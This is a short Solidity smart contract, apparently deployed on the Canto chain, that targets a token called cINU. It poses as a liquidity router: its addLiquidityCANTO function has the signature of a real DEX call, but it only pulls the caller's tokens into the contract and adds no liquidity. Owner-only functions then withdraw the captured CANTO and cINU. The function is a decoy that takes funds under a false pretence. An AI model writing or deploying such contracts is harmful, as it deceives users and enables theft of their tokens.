// SPDX-License-Identifier: The Unlicense
pragma solidity 0.8.15;

import "solmate/auth/Owned.sol";

// deployed at: 0x2505619A065bc6Bf60906C0BB8A7BB1Ad48B6383

interface ICINU {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract DogCatcher is Owned(msg.sender){

    ICINU cInu = ICINU(0x7264610A66EcA758A8ce95CF11Ff5741E1fd0455);

    constructor(){
    }

    function addLiquidityCANTO(
        address token,
        bool stable,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountCANTOMin,
        address to,
        uint deadline
    ) external payable returns (
        uint amountToken, 
        uint amountCANTO, 
        uint liquidity
    ){
        cInu.transferFrom(msg.sender, address(this), amountTokenDesired);
    }

    function retrieveCANTO(address to, uint256 amt) external onlyOwner {
        payable(to).transfer(amt);
    }

    function retrieveCINU(address to, uint256 amt) external onlyOwner {
        cInu.transfer(to, amt);
    }


}